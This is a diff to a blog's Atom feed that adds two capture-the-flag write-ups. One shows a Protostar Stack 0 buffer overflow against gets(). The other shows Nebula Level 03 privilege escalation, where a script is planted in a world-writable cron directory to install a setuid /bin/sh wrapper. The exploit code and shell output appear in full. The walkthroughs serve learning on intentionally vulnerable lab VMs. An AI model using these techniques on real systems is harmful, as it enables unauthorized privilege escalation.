@@ -4,13 +4,159 @@
  <title>Álvaro Felipe Melchor</title>
  <link href="http://alvarofe.github.io/atom.xml" rel="self"/>
  <link href="http://alvarofe.github.io/"/>
- <updated>2014-12-11T23:52:33+01:00</updated>
+ <updated>2014-12-14T18:04:50+01:00</updated>
  <id>http://alvarofe.github.io</id>
  <author>
    <name>Álvaro Felipe Melchor</name>
    <email></email>
  </author>
 
+ 
+ <entry>
+   <title>Stack 0 Protostart</title>
+   <link href="http://alvarofe.github.io/posts/protostartstack0"/>
+   <updated>2014-12-14T00:00:00+01:00</updated>
+   <id>http://alvarofe.github.io/posts/protostartstack0</id>
+   <content type="html">&lt;p&gt;I have started to play with the protostar VM along with nebula. This VM presents the concept about the memory issues as buffer overflows in stack and in the heap, format string and so on.&lt;/p&gt;
+
+&lt;p&gt;The first exercise present a buffer overflow. The code is as follows.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;you have changed the &amp;#39;modified&amp;#39; variable&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Try again?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;To resolve this puzzle we should have clear how is carried out the flow execution of a program. In the C language the stack is a structure that is used to pass argument to the function, save return address and also to save the local variables. So in the following C code the stack would be.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;The stack grows downwards
+
++————————————+
+| argument b |  The local variables are saved in reverse order.
++————————————+
+| argument a |
++————————————+
+| return     |  The return address is saved automatically by the 
+| address    |  call instruction in assembly.
++————————————+
+|            |  The base pointer register. Is used to reference 
+|    EBP     |  inside the function without calculate offset 
+|            |  respect with the ESP.
++————————————+
+|  local c   |
++————————————+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The stack in the main function is.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+————————————+
+| argument 2 |  
++————————————+
+| argument 1 |
++————————————+
+| return     |  
+| address    |  
++————————————+
+|            |   
+|    EBP     |   
+|            |  
++————————————+
+|  modified  |
++————————————+
+|  buffer    |
++————————————+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;So if we are able to write more than 64 bytes in buffer we can overwrite the value in &lt;code&gt;modified&lt;/code&gt;. But Are we able to achieve that? The answers is yes due to the code is using an insecure function &lt;code&gt;gets&lt;/code&gt;. It does not limit the input so we are able to write more than 64 bytes. So with the following we can change the value.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;%065x&amp;quot;&lt;/span&gt; 1
+00000000000000000000000000000000000000000000000000000000000000001
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./stack0
+00000000000000000000000000000000000000000000000000000000000000001
+you have changed the &lt;span class=&quot;s1&quot;&gt;&amp;#39;modified&amp;#39;&lt;/span&gt; variable
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If you want to augment your knowledge about stack and how to exploit it I encourage to read the article &lt;a href=&quot;http://q.hscott.net/reads/stack_smashing.pdf&quot;&gt;Smash the Stack For Fun And Profit by Aleph One&lt;/a&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Nebula Level 03</title>
+   <link href="http://alvarofe.github.io/posts/nebulalevel03"/>
+   <updated>2014-12-14T00:00:00+01:00</updated>
+   <id>http://alvarofe.github.io/posts/nebulalevel03</id>
+   <content type="html">&lt;p&gt;In the challenge 3 there is a crontab called every couple of minutes for user &lt;code&gt;flag03&lt;/code&gt;. The directory is as follows. &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;level03@nebula:/home/flag03&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ls -l
+total 9
+drwxrwxrwx &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; flag03 flag03   &lt;span class=&quot;m&quot;&gt;40&lt;/span&gt; Dec &lt;span class=&quot;m&quot;&gt;14&lt;/span&gt; 07:42 writable.d
+-rwxr-xr-x &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; flag03 flag03   &lt;span class=&quot;m&quot;&gt;98&lt;/span&gt; Nov &lt;span class=&quot;m&quot;&gt;20&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;2011&lt;/span&gt; writable.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Is logical to think that the script that is executed each two minutes by crontab should be writable.sh.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; i in /home/flag03/writable.d/* &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ulimit&lt;/span&gt; -t 5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; bash -x &lt;span class=&quot;s2&quot;&gt;&amp;quot;$i&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    rm -f &lt;span class=&quot;s2&quot;&gt;&amp;quot;$i&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Basically the aim of this script is to execute all files in the writable.d directory. This directory has special permission since everyone can write or read in it as &lt;code&gt;/tmp&lt;/code&gt;. We should achieve that the script &lt;code&gt;writable.sh&lt;/code&gt; executes some binary and inherit its ownership. In that way if we can execute &lt;code&gt;/bin/sh&lt;/code&gt; with the flag03 user we will be able to run &lt;code&gt;getflag&lt;/code&gt; in a flag account.&lt;/p&gt;
+
+&lt;p&gt;All what we must do is write the following program in &lt;code&gt;/tmp&lt;/code&gt; since anyone is able to write in it.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;euid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; 
+    &lt;span class=&quot;kt&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; 
+    &lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setresuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;level03@nebula:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make pwned
+cc     pwned.c   -o pwned
+level03@nebula:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat execme
+cp /tmp/pwned /home/flag03/pwned
+chown flag03 /home/flag03/pwned
+chmod u+s /home/flag03/pwned
+level03@nebula:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod +x execme
+level03@nebula:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cp execme /home/flag03/writable.d/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Copying the file execme in &lt;code&gt;/home/flag03/writable.d&lt;/code&gt;, it will be execute each two minutes by the user &lt;code&gt;flag03&lt;/code&gt;. Thanks to that,  the binary &lt;code&gt;pwned&lt;/code&gt; in the &lt;code&gt;/home/flag03&lt;/code&gt; will be set uid by the user &lt;code&gt;flag03&lt;/code&gt; and when the user &lt;code&gt;level03&lt;/code&gt; executes the binary it will run as &lt;code&gt;flag03&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;level03@nebula:/home/flag03&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ls -l
+total 9
+-rwsrwxr-x &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; flag03 flag03 &lt;span class=&quot;m&quot;&gt;7321&lt;/span&gt; Dec &lt;span class=&quot;m&quot;&gt;14&lt;/span&gt; 07:42 pwned
+drwxrwxrwx &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; flag03 flag03   &lt;span class=&quot;m&quot;&gt;40&lt;/span&gt; Dec &lt;span class=&quot;m&quot;&gt;14&lt;/span&gt; 07:42 writable.d
+-rwxr-xr-x &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; flag03 flag03   &lt;span class=&quot;m&quot;&gt;98&lt;/span&gt; Nov &lt;span class=&quot;m&quot;&gt;20&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;2011&lt;/span&gt; writable.sh
+level03@nebula:/home/flag03&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./pwned
+sh-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;996&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;flag03&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1004&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;level03&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;996&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;flag03&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1004&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;level03&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+sh-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+&lt;p&gt;If you try run &lt;code&gt;writable.sh&lt;/code&gt; by your own you execute everything with &lt;code&gt;level03&lt;/code&gt; ownership. I had a problem due to crontab is wasn’t call so I had to configure it to work. All what you should do is the following in the terminal write &lt;code&gt;crontab -e&lt;/code&gt; and configure the script to run as: &lt;code&gt;* * * * * flag03 /home/flag03/writable.sh&lt;/code&gt;. With this the script will be run each minute by the user &lt;code&gt;flag03&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If you liked this post, you can
+&lt;a href=&quot;https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel03&amp;text=Nebula Level 03&amp;via=alvaro_fe&quot;&gt;share it with your followers&lt;/a&gt;
+or
+&lt;a href=&quot;https://twitter.com/alvaro_fe&quot;&gt; follow me on Twitter&lt;/a&gt;!&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Nebula Level 02</title>
